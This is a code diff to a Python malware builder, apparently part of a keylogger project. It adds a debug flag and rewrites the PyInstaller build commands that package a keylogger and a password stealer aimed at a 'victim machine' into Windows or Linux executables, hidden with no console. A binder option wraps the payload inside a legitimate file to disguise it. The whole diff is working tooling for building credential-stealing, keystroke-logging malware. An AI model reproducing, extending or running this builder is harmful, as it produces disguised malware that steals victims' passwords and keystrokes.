@@ -27,6 +27,7 @@ def get_arguments():
     parser.add_argument("-l", "--linux", dest="linux", help="Generate a Linux executable.", action='store_true')
     parser.add_argument("-s", "--steal-password", dest="stealer", help=f"Steal Saved Password from Victim Machine [{RED}Supported OS : Windows{YELLOW}]", action='store_true')
     parser.add_argument("-b", "--bind", dest="bind", help="AutoBinder : Specify Path of Legitimate file.")
+    parser.add_argument("-d", "--debug", dest="debug", help="Payload Will Not Run In Background, Will Open A Cmd When Payload is Executed", action='store_true')
     
     
     required_arguments = parser.add_argument_group(f'{RED}Required Arguments{GREEN}')
@@ -186,19 +187,30 @@ def obfuscating_payload(file_name):
         file.write(text)
 
 def compile_for_windows(file_name, icon_path):
-    if arguments.stealer:
+    if arguments.stealer and arguments.debug:
+        subprocess.call(f"{WINDOWS_PYTHON_PYINSTALLER_PATH} --onefile --hidden-import=win32event --hidden-import=winerror --hidden-import=win32api --hidden-import=pynput.keyboard --hidden-import=keylogger --hidden-import=password_stealer {file_name} -i {icon_path}", shell=True) 
+    elif arguments.debug:
+        subprocess.call(f"{WINDOWS_PYTHON_PYINSTALLER_PATH} --onefile --hidden-import=win32event --hidden-import=winerror --hidden-import=win32api --hidden-import=pynput.keyboard --hidden-import=keylogger {file_name} -i {icon_path}", shell=True)         
+    elif arguments.stealer:
         subprocess.call(f"{WINDOWS_PYTHON_PYINSTALLER_PATH} --onefile --noconsole --hidden-import=win32event --hidden-import=winerror --hidden-import=win32api --hidden-import=pynput.keyboard --hidden-import=keylogger --hidden-import=password_stealer {file_name} -i {icon_path}", shell=True)
     else:
         subprocess.call(f"{WINDOWS_PYTHON_PYINSTALLER_PATH} --onefile --noconsole --hidden-import=win32event --hidden-import=winerror --hidden-import=win32api --hidden-import=pynput.keyboard --hidden-import=keylogger {file_name} -i {icon_path}", shell=True)
 
 def compile_for_windows_binded(file_name, icon_path):
-    if arguments.stealer:
-        subprocess.call(f"{WINDOWS_PYTHON_PYINSTALLER_PATH} --onefile  --hidden-import=win32event --hidden-import=winerror --hidden-import=win32api --hidden-import=pynput.keyboard --hidden-import=keylogger --hidden-import=password_stealer {file_name} -i {icon_path} --add-data \"{arguments.bind};.\"", shell=True)
+    if arguments.stealer and arguments.debug:
+        subprocess.call(f"{WINDOWS_PYTHON_PYINSTALLER_PATH} --onefile --hidden-import=win32event --hidden-import=winerror --hidden-import=win32api --hidden-import=pynput.keyboard --hidden-import=keylogger --hidden-import=password_stealer {file_name} -i {icon_path} --add-data \"{arguments.bind};.\"", shell=True)
+    elif arguments.debug:
+        subprocess.call(f"{WINDOWS_PYTHON_PYINSTALLER_PATH} --onefile --hidden-import=win32event --hidden-import=winerror --hidden-import=win32api --hidden-import=pynput.keyboard --hidden-import=keylogger {file_name} -i {icon_path} --add-data \"{arguments.bind};.\"", shell=True)
+    elif arguments.stealer:
+        subprocess.call(f"{WINDOWS_PYTHON_PYINSTALLER_PATH} --onefile --noconsole --hidden-import=win32event --hidden-import=winerror --hidden-import=win32api --hidden-import=pynput.keyboard --hidden-import=keylogger --hidden-import=password_stealer {file_name} -i {icon_path} --add-data \"{arguments.bind};.\"", shell=True)
     else:
         subprocess.call(f"{WINDOWS_PYTHON_PYINSTALLER_PATH} --onefile --noconsole --hidden-import=win32event --hidden-import=winerror --hidden-import=win32api --hidden-import=pynput.keyboard --hidden-import=keylogger {file_name} -i {icon_path} --add-data \"{arguments.bind};.\"", shell=True)    
 
 def compile_for_linux(file_name, icon_path):
-    subprocess.call(f"pyinstaller --onefile --noconsole --hidden-import=pynput.keyboard --hidden-import=keylogger {file_name} -i {icon_path}", shell=True)
+    if arguments.debug:
+        subprocess.call(f"pyinstaller --onefile --hidden-import=pynput.keyboard --hidden-import=keylogger {file_name} -i {icon_path}", shell=True)
+    else:
+        subprocess.call(f"pyinstaller --onefile --noconsole --hidden-import=pynput.keyboard --hidden-import=keylogger {file_name} -i {icon_path}", shell=True)
 
 def del_junk_file(file_name):
     try:
